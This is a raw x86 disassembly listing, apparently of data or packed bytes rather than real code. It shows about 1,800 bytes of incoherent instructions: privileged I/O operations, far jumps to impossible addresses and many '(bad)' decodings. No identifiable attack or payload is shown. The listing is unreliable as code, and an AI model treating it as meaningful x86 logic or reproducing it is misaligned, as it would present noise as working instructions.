  401ab7:	mov    ah,0x4c
  401ab9:	mov    WORD PTR [ecx],?
  401abb:	jge    0x401af9
  401abd:	and    al,0xdb
  401abf:	cmp    BYTE PTR [esi],dl
  401ac1:	sub    ch,BYTE PTR [esi+ebx*8-0x1c08a05]
  401ac8:	aam    0x8e
  401aca:	dec    eax
  401acb:	mov    esp,0x12230d24
  401ad0:	sub    edx,DWORD PTR [esi+0x8]
  401ad3:	lods   al,BYTE PTR ds:[esi]
  401ad4:	add    ecx,eax
  401ad6:	jmp    FWORD PTR [ebp-0x11dae857]
  401adc:	leave  
  401add:	adc    al,0xe9
  401adf:	ror    BYTE PTR [esi+0x2e522287],1
  401ae5:	xchg   esi,eax
  401ae6:	sbb    al,BYTE PTR [eax]
  401ae8:	int    0xad
  401aea:	inc    ebx
  401aeb:	nop
  401aec:	test   eax,0xb0ef300d
  401af1:	cmp    ecx,DWORD PTR [eax+0x27]
  401af4:	mov    dl,0xdc
  401af6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401af7:	stc    
  401af8:	popf   
  401af9:	ja     0xbd7536f7
  401aff:	pop    ecx
  401b00:	adc    BYTE PTR [ebx-0x76031dab],bl
  401b06:	dec    esp
  401b07:	cs mov dl,0xb6
  401b0a:	fwait
  401b0b:	ds inc edx
  401b0d:	or     bl,bh
  401b0f:	mov    DWORD PTR [esi+0x78],ecx
  401b12:	mov    esi,0x82073746
  401b17:	adc    dl,BYTE PTR [edx-0x79a457b4]
  401b1d:	scas   eax,DWORD PTR es:[edi]
  401b1e:	pusha  
  401b1f:	imul   eax,DWORD PTR [ebx],0x40
  401b22:	loop   0x401b9f
  401b24:	cmp    eax,edi
  401b26:	mov    ebp,0x62a1a6d0
  401b2b:	lar    ebp,WORD PTR [ecx+0x27ef2e27]
  401b32:	jge    0x401b12
  401b34:	and    BYTE PTR [esi-0x4f05c2b4],ah
  401b3a:	lds    esi,FWORD PTR [eax]
  401b3c:	ret    
  401b3d:	sub    al,BYTE PTR [edi]
  401b3f:	stos   BYTE PTR es:[edi],al
  401b40:	xchg   edi,edx
  401b42:	jp     0x401b70
  401b44:	mov    ds:0xfc5d8fc9,eax
  401b49:	jns    0x401aef
  401b4b:	mov    eax,ds:0xfa8f3fc8
  401b50:	jmp    0x1757:0x74d3ab36
  401b57:	dec    ecx
  401b58:	sub    BYTE PTR [esp+esi*1+0x3d8e3c4],al
  401b5f:	jne    0x401b43
  401b61:	cmp    al,0xe2
  401b63:	and    bl,ch
  401b65:	cmp    ecx,DWORD PTR [ebp-0x1e]
  401b68:	lahf   
  401b69:	inc    ecx
  401b6a:	jne    0x401b1d
  401b6c:	xlat   BYTE PTR ds:[ebx]
  401b6d:	cwde   
  401b6e:	and    BYTE PTR [ebx+0xb7e1228],0x25
  401b75:	rol    DWORD PTR [edi],0xd3
  401b78:	pop    ds
  401b79:	sbb    esp,ebx
  401b7b:	jge    0x401b1c
  401b7d:	push   edi
  401b7e:	xchg   BYTE PTR [edx],bh
  401b80:	sbb    cl,BYTE PTR [ebx]
  401b82:	scas   eax,DWORD PTR es:[edi]
  401b83:	add    eax,0xbac06211
  401b88:	xchg   dh,al
  401b8a:	pushf  
  401b8b:	inc    edi
  401b8c:	cmp    eax,ebp
  401b8e:	pop    edx
  401b8f:	jbe    0x401bee
  401b91:	mov    edi,0xb7559d96
  401b96:	xor    DWORD PTR [edx+0x54740bbb],ecx
  401b9c:	jne    0x401c1d
  401b9e:	fisub  WORD PTR [ecx]
  401ba0:	test   DWORD PTR [esi+0x7b],ebp
  401ba3:	(bad)  
  401ba4:	fnstsw WORD PTR [edx]
  401ba6:	imul   ecx,DWORD PTR ds:0x3bc21047,0xffffffe4
  401bad:	sar    DWORD PTR [ebx],0x45
  401bb0:	mov    WORD PTR [esi+0x4e],?
  401bb3:	repnz inc ecx
  401bb5:	pop    ebx
  401bb6:	fadd   QWORD PTR [esp+esi*8-0x49557819]
  401bbd:	fdiv   DWORD PTR [esi]
  401bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bc0:	pop    ss
  401bc1:	jmp    0xdc7526cc
  401bc6:	stos   DWORD PTR es:[edi],eax
  401bc7:	out    dx,al
  401bc8:	pop    ss
  401bc9:	aad    0xb1
  401bcb:	push   es
  401bcc:	mov    ecx,0x1b46e681
  401bd1:	leave  
  401bd2:	sbb    eax,0xe0bdfcec
  401bd7:	out    0x3d,al
  401bd9:	test   DWORD PTR [eax-0x9b45941],0x350e4f69
  401be3:	pushf  
  401be4:	or     al,0x18
  401be6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401be7:	mov    eax,ds:0x236e5edb
  401bec:	mov    BYTE PTR [esi-0x6a1749b5],dl
  401bf2:	jecxz  0x401c5e
  401bf4:	in     al,dx
  401bf5:	add    BYTE PTR ds:0x2af2571c,al
  401bfb:	neg    DWORD PTR [ecx+0x23]
  401bfe:	push   esp
  401bff:	push   edx
  401c00:	inc    edx
  401c01:	inc    DWORD PTR [edi-0x53]
  401c04:	sahf   
  401c05:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  401c07:	pop    eax
  401c08:	inc    ecx
  401c09:	loop   0x401b95
  401c0b:	sbb    ebp,DWORD PTR [ebp+0x7e]
  401c0e:	loope  0x401bcb
  401c10:	adc    eax,0xeba78445
  401c15:	adc    BYTE PTR [ebx-0x1f],al
  401c18:	test   eax,0x30451d90
  401c1d:	out    0x0,al
  401c1f:	pop    edx
  401c20:	pop    edx
  401c21:	mov    ds:0x9f95ee5e,eax
  401c26:	mov    dl,0x51
  401c28:	xchg   edi,eax
  401c29:	jge    0x401c34
  401c2b:	xchg   DWORD PTR gs:[edi+0x33972138],edx
  401c32:	mov    dh,0x9a
  401c34:	xor    ch,BYTE PTR [edi-0x29]
  401c37:	sub    ebx,DWORD PTR [eax-0x32]
  401c3a:	iret   
  401c3b:	test   BYTE PTR [ebx],ah
  401c3d:	xchg   edx,eax
  401c3e:	xor    al,0x5
  401c40:	cmp    eax,0x191429bd
  401c45:	ficomp DWORD PTR [eax+0xa]
  401c48:	es ret 0x3b4e
  401c4c:	add    BYTE PTR ds:0x43d6f3a1,dl
  401c52:	or     BYTE PTR [eax+0x39b396ef],ch
  401c58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c59:	cmp    eax,0x74432257
  401c5e:	hlt    
  401c5f:	sahf   
  401c60:	and    al,0xaa
  401c62:	and    BYTE PTR [edi+0xd],ch
  401c65:	adc    DWORD PTR [edi],ecx
  401c67:	arpl   ax,bx
  401c69:	sub    al,0x9b
  401c6b:	stc    
  401c6c:	and    al,0xb4
  401c6e:	jl     0x401c3f
  401c70:	imul   edx,DWORD PTR [esi],0xffffffff
  401c73:	mov    bl,bl
  401c75:	xchg   edi,ecx
  401c77:	test   eax,0x4d7811b7
  401c7c:	pop    edx
  401c7d:	jg     0x401c8c
  401c7f:	pusha  
  401c80:	scas   al,BYTE PTR es:[edi]
  401c81:	sbb    esi,DWORD PTR [esi]
  401c83:	les    ebp,FWORD PTR [ecx-0x3e]
  401c86:	sbb    al,0x4f
  401c88:	(bad)  [edi-0x73d7f3ce]
  401c8e:	out    0x85,al
  401c90:	add    eax,0x2b97064a
  401c95:	lds    edi,FWORD PTR [ebx]
  401c97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c98:	xchg   ecx,eax
  401c99:	or     esi,esp
  401c9b:	sbb    eax,0xfa447761
  401ca0:	test   BYTE PTR ds:0xbe1c7d36,ah
  401ca6:	inc    eax
  401ca7:	add    ah,BYTE PTR [ebx+0x72]
  401caa:	push   ds
  401cab:	pop    edi
  401cac:	lock xor al,0xe2
  401caf:	add    ah,BYTE PTR [ebx]
  401cb1:	jb     0x401c6d
  401cb3:	test   eax,0xe39d227d
  401cb8:	pshufw mm4,mm6,0x26
  401cbc:	xor    eax,DWORD PTR [ecx]
  401cbe:	pusha  
  401cbf:	add    DWORD PTR [edx],edx
  401cc1:	dec    BYTE PTR [edi]
  401cc3:	(bad)  
  401cc4:	jno    0x401ce0
  401cc6:	sbb    edx,0x5a
  401cc9:	nop
  401cca:	and    ebp,ecx
  401ccc:	mov    dh,0xd1
  401cce:	mov    BYTE PTR [ebx-0x7a],dh
  401cd1:	pop    eax
  401cd2:	sub    ebp,DWORD PTR [ebp+0x5f8da9bb]
  401cd8:	(bad)  
  401cda:	call   FWORD PTR [ebp-0x72754d39]
  401ce0:	shl    BYTE PTR [ecx+edi*8+0x56799211],1
  401ce7:	pop    esp
  401ce8:	mov    ch,ch
  401cea:	fimul  WORD PTR [edx-0x2e]
  401ced:	stc    
  401cee:	sub    al,0x9e
  401cf0:	repz mov ch,0x54
  401cf3:	mov    ecx,0x56c6c517
  401cf8:	push   ds
  401cf9:	push   esp
  401cfa:	jmp    0x2bdc:0x763502cb
  401d01:	or     DWORD PTR [eax+0xe],0x3
  401d05:	test   DWORD PTR [ebx+0x6d21191c],esp
  401d0b:	or     BYTE PTR [ebx+edx*4],dl
  401d0e:	push   DWORD PTR [ebx+0x6e]
  401d11:	clc    
  401d12:	mov    bl,0xeb
  401d14:	das    
  401d15:	arpl   WORD PTR [ecx+0x15171995],dx
  401d1b:	aas    
  401d1c:	mov    edi,0x8e43498e
  401d21:	aam    0xd1
  401d23:	push   ss
  401d24:	push   0x586423ef
  401d29:	cmp    ebx,ecx
  401d2b:	cmp    BYTE PTR [ebx],ch
  401d2d:	ret    
  401d2e:	inc    edx
  401d2f:	rcr    bl,cl
  401d31:	les    eax,FWORD PTR [edx+0x2f]
  401d34:	out    0xc,al
  401d36:	pop    esi
  401d37:	ret    0x977f
  401d3a:	pop    ebp
  401d3b:	jl     0x401db3
  401d3d:	dec    eax
  401d3e:	lds    eax,FWORD PTR [esi+eax*8-0x2ac898be]
  401d45:	sub    al,0x65
  401d47:	pop    es
  401d48:	adc    DWORD PTR [ecx],edi
  401d4a:	mov    ds:0xd1047473,eax
  401d4f:	fnsave [edi-0x6]
  401d52:	cmp    ebx,DWORD PTR [esi-0x4f]
  401d55:	sub    al,ah
  401d57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d58:	data16 (bad) 
  401d5a:	jae    0x401d97
  401d5c:	ja     0x401d40
  401d5e:	xor    ebx,DWORD PTR [ebp+edi*1-0x586fad0]
  401d65:	push   es
  401d66:	nop
  401d67:	ror    DWORD PTR [esi-0x783819ea],1
  401d6d:	test   DWORD PTR ds:0x492c98b0,eax
  401d73:	mov    bl,BYTE PTR [edx-0x5102a541]
  401d79:	sbb    al,0xcd
  401d7b:	or     al,0x31
  401d7d:	mov    ebx,0x22f4f71d
  401d82:	call   0xbc5407c6
  401d87:	ja     0x401d5f
  401d89:	ja     0x401d44
  401d8b:	mov    esp,0x3e5eb2de
  401d90:	add    esp,eax
  401d92:	ja     0x401d32
  401d94:	call   0x6c93e657
  401d99:	fidiv  DWORD PTR [edx-0x3b]
  401d9c:	add    eax,0xcd8c7f9b
  401da1:	ds daa 
  401da3:	ret    
  401da4:	jo     0x401dc3
  401da6:	push   edi
  401da7:	lahf   
  401da8:	cmp    esp,ebx
  401daa:	adc    dh,BYTE PTR [edi]
  401dac:	mov    ds:0x3437c559,eax
  401db1:	mov    cl,0xdd
  401db3:	js     0x401df4
  401db5:	mov    eax,0xe1864d80
  401dba:	xor    BYTE PTR [edi+0x6a],cl
  401dbd:	sbb    eax,esp
  401dbf:	adc    BYTE PTR [edx+0x6ba53124],ch
  401dc5:	mul    esp
  401dc7:	popf   
  401dc8:	dec    ebx
  401dc9:	mov    esi,0x83983dc4
  401dce:	xor    eax,0xf75b04b2
  401dd3:	xor    eax,0x334b52fa
  401dd8:	test   eax,0x3ff297b8
  401ddd:	shr    ecx,0xf8
  401de0:	call   0x8372576f
  401de5:	jg     0x401dc7
  401de7:	ret    
  401de8:	loopne 0x401e59
  401dea:	cmp    al,0x38
  401dec:	enter  0xa6d,0x1e
  401df0:	and    ch,ch
  401df2:	jns    0x401e21
  401df4:	cmp    edx,DWORD PTR es:[eax-0x222832b5]
  401dfb:	mov    bl,BYTE PTR [ebp-0x6a14d917]
  401e01:	cmc    
  401e02:	enter  0xa37c,0x27
  401e06:	jnp    0x401e77
  401e08:	sub    al,0x49
  401e0a:	pop    esi
  401e0b:	idiv   DWORD PTR [eax]
  401e0d:	sar    dl,cl
  401e0f:	fs jns 0x401e39
  401e12:	(bad)  [edi-0x2a]
  401e15:	adc    al,0xf5
  401e17:	mov    DWORD PTR [edi-0x4db964ec],esp
  401e1d:	stos   BYTE PTR es:[edi],al
  401e1e:	inc    ecx
  401e1f:	pop    esi
  401e20:	and    eax,0xfd4504b1
  401e25:	jnp    0x401df0
  401e27:	out    dx,al
  401e28:	or     ch,BYTE PTR [ecx]
  401e2a:	add    eax,0x939e9fa4
  401e2f:	enter  0xca50,0x2b
  401e33:	(bad)  
  401e34:	imul   ebp,DWORD PTR [edi+ebx*8-0x5c],0x239170c5
  401e3c:	ret    0xcde5
  401e3f:	lods   eax,DWORD PTR ds:[esi]
  401e40:	ret    0x4089
  401e43:	sub    BYTE PTR [edx],ch
  401e45:	repz jns 0x401e99
  401e48:	xor    DWORD PTR [eax],ebx
  401e4a:	pop    ss
  401e4b:	rcr    BYTE PTR [edx],0x6f
  401e4e:	xor    eax,0xd9208fca
  401e53:	or     DWORD PTR [ecx+edi*4],0x23
  401e57:	sbb    BYTE PTR [ecx+ebx*1+0xe],al
  401e5b:	push   eax
  401e5c:	cdq    
  401e5d:	arpl   WORD PTR [ecx-0x19c892c5],ax
  401e63:	cmp    eax,0x4b551a03
  401e68:	addr16 into 
  401e6a:	pop    eax
  401e6b:	sub    eax,0xce859e18
  401e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e71:	jo     0x401eea
  401e73:	test   DWORD PTR [ebp-0x29],esi
  401e76:	sbb    al,BYTE PTR [edx+0x6e]
  401e79:	hlt    
  401e7a:	fwait
  401e7b:	imul   BYTE PTR [edi+0x68171ecf]
  401e81:	mov    dl,0xfc
  401e83:	out    0x52,al
  401e85:	xchg   ebx,eax
  401e86:	stc    
  401e87:	mov    dl,0x53
  401e89:	out    dx,al
  401e8a:	mov    BYTE PTR [esi-0x67],0x8c
  401e8e:	ficomp DWORD PTR [esi-0x45]
  401e91:	int3   
  401e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e93:	fnstenv [ecx+0x5283cff7]
  401e99:	push   0x3fa2e6d0
  401e9e:	pop    ebp
  401e9f:	div    BYTE PTR [ebx]
  401ea1:	push   esp
  401ea2:	loop   0x401eb0
  401ea4:	pop    es
  401ea5:	mov    edx,0x2a3c6bf9
  401eaa:	mov    ch,0x77
  401eac:	adc    bl,dl
  401eae:	in     al,0x50
  401eb0:	scas   al,BYTE PTR es:[edi]
  401eb1:	iret   
  401eb2:	test   eax,0x6aaafdc9
  401eb7:	(bad)  
  401eb8:	cli    
  401eb9:	and    al,0xfd
  401ebb:	data16 int 0xe
  401ebe:	jo     0x401f3d
  401ec0:	push   ecx
  401ec1:	push   ecx
  401ec2:	mov    ch,0xd4
  401ec4:	add    esi,DWORD PTR [ecx+ebp*4-0x3d8d0814]
  401ecb:	mov    al,0xc3
  401ecd:	inc    esi
  401ece:	test   al,0x57
  401ed0:	cmp    dl,BYTE PTR [edx]
  401ed2:	add    al,0x32
  401ed4:	dec    eax
  401ed5:	pop    ebp
  401ed6:	dec    edx
  401ed7:	jno    0x401e7d
  401ed9:	jns    0x401eb4
  401edb:	(bad)  
  401edc:	(bad)  
  401edd:	(bad)  
  401ede:	and    al,0x8
  401ee0:	mov    edx,0x9b785a6a
  401ee5:	sub    eax,0x72924e3a
  401eea:	in     eax,0xde
  401eec:	mov    dh,0x78
  401eee:	xor    ecx,DWORD PTR es:0x133aeff0
  401ef5:	in     eax,0x5b
  401ef7:	in     eax,dx
  401ef8:	mov    al,0xa6
  401efa:	(bad)  
  401efb:	shl    BYTE PTR [ebx],0xa
  401efe:	loop   0x401eee
  401f00:	das    
  401f01:	adc    BYTE PTR [edi],0x51
  401f04:	sar    ecx,cl
  401f06:	loopne 0x401f77
  401f08:	xchg   BYTE PTR [edi-0x13c5dbcb],bh
  401f0e:	pusha  
  401f0f:	jle    0x401ec2
  401f11:	popa   
  401f12:	out    dx,al
  401f13:	test   eax,0xbbcbe423
  401f18:	ins    DWORD PTR es:[edi],dx
  401f19:	rcr    DWORD PTR [esi+0x2f],0x60
  401f1d:	inc    edi
  401f1e:	dec    ecx
  401f1f:	adc    ecx,edx
  401f21:	icebp  
  401f22:	dec    edi
  401f23:	xchg   edi,eax
  401f24:	fwait
  401f25:	or     DWORD PTR [ebx+0x9],ebp
  401f28:	or     DWORD PTR [ebx+0x7c],0x8d65661b
  401f2f:	fnstcw WORD PTR [edi+eiz*1+0x5e0d5710]
  401f36:	mov    bh,0x41
  401f38:	jmp    0xbd3e876d
  401f3d:	and    eax,0x5b0a128c
  401f42:	outs   dx,BYTE PTR ds:[esi]
  401f43:	or     ecx,edi
  401f45:	repz and BYTE PTR [edi+0x6f78d27d],al
  401f4c:	pusha  
  401f4d:	sub    eax,0xfe234e15
  401f52:	jmp    0x175ad6c4
  401f57:	jne    0x401f54
  401f59:	inc    esi
  401f5a:	jns    0x401f15
  401f5c:	push   ss
  401f5d:	xor    edx,DWORD PTR [ecx]
  401f5f:	in     eax,dx
  401f60:	sbb    eax,0xf069408b
  401f65:	outs   dx,BYTE PTR ds:[esi]
  401f66:	ja     0xdce00a11
  401f6c:	jbe    0x401f0a
  401f6e:	cmc    
  401f6f:	xor    eax,0xdb57a67c
  401f74:	adc    bh,BYTE PTR [ebx+0x10f244f5]
  401f7a:	pop    es
  401f7b:	outs   dx,DWORD PTR ds:[esi]
  401f7c:	lock mov bl,0x9e
  401f7f:	xor    eax,0x2db32517
  401f84:	int    0xf3
  401f86:	shr    BYTE PTR [ecx-0x1d],1
  401f89:	cld    
  401f8a:	mov    esi,0xe97f6c9c
  401f8f:	in     eax,dx
  401f90:	mov    esi,0xa5e6b009
  401f95:	call   0x53d1ed1a
  401f9a:	and    BYTE PTR ds:0xb8a41cd9,bl
  401fa0:	push   ds
  401fa1:	dec    eax
  401fa2:	fdiv   DWORD PTR [esi+0x6d]
  401fa5:	rol    BYTE PTR [ebp+0x1e],cl
  401fa8:	sti    
  401fa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401faa:	out    dx,eax
  401fab:	mov    al,0x11
  401fad:	mov    ecx,0xccd8cc0e
  401fb2:	mov    esi,0xaeb7ecae
  401fb7:	cmp    DWORD PTR [ecx-0x23],ecx
  401fba:	aas    
  401fbb:	xlat   BYTE PTR ds:[ebx]
  401fbc:	rcr    DWORD PTR [eax+0x7c6513f0],0xe5
  401fc3:	cmp    eax,0x76242625
  401fc8:	cmp    cl,al
  401fca:	jl     0x401f58
  401fcc:	cmp    DWORD PTR [ecx+0x22],esi
  401fcf:	popf   
  401fd0:	mov    WORD PTR [esi+0x47],?
  401fd3:	push   esp
  401fd4:	sub    al,0xa4
  401fd6:	popf   
  401fd7:	lds    ecx,FWORD PTR [ebx]
  401fd9:	inc    ecx
  401fda:	add    BYTE PTR ds:0x34c393ef,bh
  401fe0:	rcr    ch,0x86
  401fe3:	dec    esp
  401fe4:	sbb    eax,0x3144c92e
  401fe9:	fiadd  DWORD PTR [edx]
  401feb:	jge    0x401fdd
  401fed:	xchg   ebx,eax
  401fee:	fs jle 0x402046
  401ff1:	or     eax,0x5817008
  401ff6:	loopne 0x401f85
  401ff8:	adc    esp,DWORD PTR [ecx]
  401ffa:	mov    dh,0x46
  401ffc:	sub    al,0x81
  401ffe:	mov    WORD PTR [ebx*4-0x2c31a325],es
  402005:	and    ch,ah
  402007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402008:	(bad)  [edi]
  40200a:	jge    0x401fd9
  40200c:	lea    ecx,[edx]
  40200e:	mov    edi,0x2f6d96e8
  402013:	adc    eax,0x2f824999
  402018:	sbb    dl,BYTE PTR [ecx+ebp*1+0x419803a1]
  40201f:	inc    ebx
  402020:	push   ss
  402021:	aad    0xaf
  402023:	hlt    
  402024:	jecxz  0x4020a3
  402026:	cmp    ebp,DWORD PTR [edx-0x4a]
  402029:	gs ins BYTE PTR es:[edi],dx
  40202b:	js     0x401fbf
  40202d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40202e:	ficom  DWORD PTR [edx+0x5396765a]
  402034:	jmp    0x40208a
  402036:	xlat   BYTE PTR ds:[ebx]
  402037:	pop    ss
  402038:	inc    eax
  402039:	mov    dh,0x85
  40203b:	sub    esi,DWORD PTR [esi-0x6e72fac]
  402041:	add    eax,edx
  402043:	mov    ecx,0xadb5e8ff
  402048:	or     bl,al
  40204a:	stos   BYTE PTR es:[edi],al
  40204b:	ret    
  40204c:	sub    BYTE PTR [ebx-0xd768b6b],dh
  402052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402054:	sub    ch,BYTE PTR [ebp+0x30345672]
  40205a:	dec    ebp
  40205b:	pop    edx
  40205c:	fisub  DWORD PTR [eax+0x41]
  40205f:	push   ecx
  402060:	(bad)  
  402061:	cmp    ebx,DWORD PTR [ebx-0x1d]
  402064:	mov    ds:0x5c3fa807,al
  402069:	das    
  40206a:	pop    eax
  40206b:	mov    cl,0x48
  40206d:	out    0xd4,al
  40206f:	push   gs
  402071:	jno    0x4020a6
  402073:	sub    DWORD PTR [esi],ebx
  402075:	jne    0x4020ac
  402077:	scas   al,BYTE PTR es:[edi]
  402078:	adc    al,0x64
  40207a:	pusha  
  40207b:	xor    bl,dl
  40207d:	out    0xe1,eax
  40207f:	aad    0x8a
  402081:	sub    al,BYTE PTR [ebx-0xc]
  402084:	pushf  
  402085:	sti    
  402086:	test   al,0x72
  402088:	(bad)  
  402089:	and    BYTE PTR [esi*2+0x3274a1bd],al
  402090:	cli    
  402091:	ins    DWORD PTR es:[edi],dx
  402092:	or     al,0x75
  402094:	imul   esp,ebp,0x1a
  402097:	mov    dl,0xe7
  402099:	jno    0x402034
  40209b:	int    0x5f
  40209d:	mov    BYTE PTR [edx+0x11],dh
  4020a0:	add    eax,0x11fc702
  4020a5:	jmp    0x40209c
  4020a7:	pop    ebp
  4020a8:	push   edi
  4020a9:	rcr    BYTE PTR [eax],cl
  4020ab:	aam    0x4f
  4020ad:	adc    ebp,DWORD PTR [ecx]
  4020af:	imul   esi,DWORD PTR [eax],0xd1e5b8cc
  4020b5:	inc    edx
  4020b6:	cmp    al,0xc0
  4020b8:	sbb    DWORD PTR [eax],0x3a
  4020bb:	jnp    0x402108
  4020bd:	test   eax,0x2d42ea2b
  4020c2:	fsub   QWORD PTR [edi]
  4020c4:	mov    eax,ds:0x53a7d52
  4020c9:	xor    al,0x6b
  4020cb:	adc    al,0xa6
  4020cd:	cld    
  4020ce:	and    al,0x30
  4020d0:	dec    eax
  4020d1:	(bad)  
  4020d2:	rcr    BYTE PTR [edx+eiz*8-0x7c],0xbc
  4020d7:	mov    edi,0xd6b10ad7
  4020dc:	sub    al,0x10
  4020de:	test   al,0x15
  4020e0:	out    dx,al
  4020e1:	(bad)  
  4020e2:	jg     0x402114
  4020e4:	xchg   ecx,eax
  4020e5:	imul   ebp,ebp,0xdf1493e4
  4020eb:	adc    BYTE PTR [eax-0x5853829e],cl
  4020f1:	sbb    ebp,DWORD PTR [ecx]
  4020f3:	fild   QWORD PTR [ebx]
  4020f5:	and    DWORD PTR [ebx+0x2f],ebx
  4020f8:	mov    DWORD PTR [ecx-0x7139c1e5],edx
  4020fe:	push   0x64a5b7dc
  402103:	jns    0x4020ae
  402105:	test   al,0xa3
  402107:	sqrtps xmm6,XMMWORD PTR [esi-0x45]
  40210b:	iret   
  40210c:	add    cl,0xf7
  40210f:	cmp    eax,0xf60aa3ce
  402114:	iret   
  402115:	mov    ds:0x824ba8a2,al
  40211a:	(bad)
  40211f:	jge    0x4020c4
  402121:	mov    ds:0x518b3b70,al
  402126:	push   ebx
  402127:	icebp  
  402128:	arpl   WORD PTR [edx+0x4cedc7f9],ax
  40212e:	pop    eax
  40212f:	adc    ebp,eax
  402131:	ret    
  402132:	clc    
  402133:	mov    ds:0x393237a4,al
  402138:	xchg   ecx,ebp
  40213a:	or     esi,ebx
  40213c:	repnz mov ?,WORD PTR [eax]
  40213f:	jle    0x4020f6
  402141:	mov    ds:0xc71f7cfb,al
  402146:	pop    eax
  402147:	ror    DWORD PTR [esi-0x547c00b0],1
  40214d:	aas    
  40214e:	cmp    BYTE PTR ds:[edi],0x4
  402152:	jae    0x402155
  402154:	mov    al,ds:0xb5f2bfdb
  402159:	inc    edi
  40215a:	inc    eax
  40215b:	jl     0x4021d5
  40215d:	test   al,0x45
  40215f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402160:	adc    al,0x14
  402162:	mov    ecx,0xdb43b69
  402167:	and    ebx,DWORD PTR ds:0xb649aaae
  40216d:	inc    ecx
  40216e:	jge    0x4021c6
  402170:	mov    bh,0x34
  402172:	stos   DWORD PTR es:[edi],eax
  402173:	enter  0x2ddc,0xfc
  402177:	xchg   edi,eax
  402178:	enter  0x622e,0x86
  40217c:	jne    0x4021e7
  40217e:	xor    DWORD PTR [ebx],esp
  402180:	mov    DWORD PTR [ebp+0x6ff9685f],ebp
  402186:	clc    
  402187:	pop    fs
  402189:	mov    ch,0x1c
  40218b:	addr16 sahf 
  40218d:	dec    ebx
  40218e:	call   0xaba7a3d7
  402193:	mov    ebp,0x1206bb9a
  402198:	xor    esi,ebx
  40219a:	fwait
  40219b:	cld    
  40219c:	push   cs
  40219d:	dec    ebx
  40219e:	pop    es
  40219f:	inc    esi
  4021a0:	int    0x28
  4021a2:	xor    eax,0xf6e963d2
  4021a7:	int3   
  4021a8:	sar    DWORD PTR [esi+0x33],0x22
  4021ac:	(bad)
  4021af:	mov    al,ds:0x1e0e8fb1
  4021b4:	scas   eax,DWORD PTR es:[edi]
  4021b5:	cld    
  4021b6:	and    DWORD PTR [eax+0x7e],edx
  4021b9:	xor    BYTE PTR [ebx+0x3b],dl
  4021bc:	add    BYTE PTR [ebx],al
  4021be:	cmp    eax,esp
  4021c0:	cdq    
  4021c1:	aaa    
  4021c2:	inc    edi
  4021c3:	fmul   st,st(3)
  4021c5:	push   edx
  4021c6:	cmp    al,0x24
  4021c8:	clc    
  4021c9:	mov    esp,0x7525c73
  4021ce:	pop    edx
  4021cf:	inc    esp
  4021d0:	arpl   WORD PTR [ecx],cx
  4021d2:	mov    bl,0x41
  4021d4:	inc    ebx
  4021d5:	jge    0x402241
  4021d7:	cli    
  4021d8:	sbb    dh,ah
  4021da:	sub    eax,0x42c927
  4021df:	lods   al,BYTE PTR ds:[esi]
  4021e0:	mov    edi,0xf458b2e
  4021e5:	je     0x402214
  4021e7:	pop    ebp
  4021e8:	xor    BYTE PTR ss:[ecx-0x602db5bc],0xef
  4021f0:	sar    DWORD PTR [esi-0x28008d52],cl
  4021f6:	mov    cs,WORD PTR [edi]
  4021f8:	inc    ebx
  4021f9:	dec    esi
  4021fa:	jns    0x402239
  4021fc:	fwait
  4021fd:	popa   
  4021fe:	fcomp  QWORD PTR [ecx-0x7f740323]
  402204:	push   edi
  402205:	pop    esi
  402206:	lock mov bl,BYTE PTR [esp+ecx*4]
  40220a:	sahf   
  40220b:	jmp    0x6ecaa26d
  402210:	pop    esi
  402211:	(bad)  
  402212:	in     al,dx
  402213:	sub    BYTE PTR ss:[edx],al
  402216:	out    dx,eax
  402217:	or     cl,BYTE PTR [ebp-0xd]
  40221a:	jnp    0x4021f3
  40221c:	mov    ah,0x22
  40221e:	movzx  edi,al
  402221:	mov    edx,0x893f54b
  402226:	std    
  402227:	cmp    dl,0x61
  40222a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40222b:	outs   dx,BYTE PTR ds:[esi]
  40222c:	cmp    esp,DWORD PTR [esp+ebp*8+0x1d]
  402230:	nop
  402231:	loope  0x4021ca
  402233:	push   cs
  402234:	lahf   
  402235:	xchg   ebp,eax
  402236:	fild   QWORD PTR [edx]
  402238:	pop    ss
  402239:	ja     0x402252
  40223b:	xor    eax,0x17713812
  402240:	inc    eax
  402241:	jge    0x4021fa
  402243:	inc    eax
  402244:	imul   edi,DWORD PTR [ecx+0x1f],0xfffffff8
  402248:	mov    edi,0x850230df
  40224d:	pop    es
  40224e:	mov    dl,0x47
  402250:	sub    dl,bh
  402252:	mov    ds:0xfde9ad82,al
  402257:	jl     0x402222
  402259:	jmp    0x206e7296
  40225e:	imul   bx,bx,0x1e5b
  402263:	jecxz  0x402293
  402265:	sbb    DWORD PTR [edx-0xf],edi
  402268:	pop    edx
  402269:	pop    ss
  40226a:	and    BYTE PTR [ebx+edi*1],dl
  40226d:	inc    esi
  40226e:	fs clc 
  402270:	add    edi,DWORD PTR [ecx+0x5a]
  402273:	inc    ebp
  402274:	push   es
  402275:	pusha  
  402276:	pop    es
  402277:	fadd   DWORD PTR [ebx]
  402279:	lods   eax,DWORD PTR ds:[esi]
  40227a:	xchg   edi,eax
  40227b:	retf   0xc7b8
  40227e:	sub    bl,bh
  402280:	push   0xee4f0c6e
  402285:	mov    bh,0x25
  402287:	mov    al,0x7d
  402289:	cmp    BYTE PTR [ecx-0x31],dl
  40228c:	pop    ebp
  40228d:	test   eax,0xa3e09ce0
  402292:	jmp    0x402272
  402294:	push   edx
  402295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402296:	lahf   
  402297:	out    0x58,al
  402299:	xchg   bl,bl
  40229b:	test   DWORD PTR [eax],edx
  40229d:	cmp    dh,BYTE PTR [esi+ebx*8-0x66]
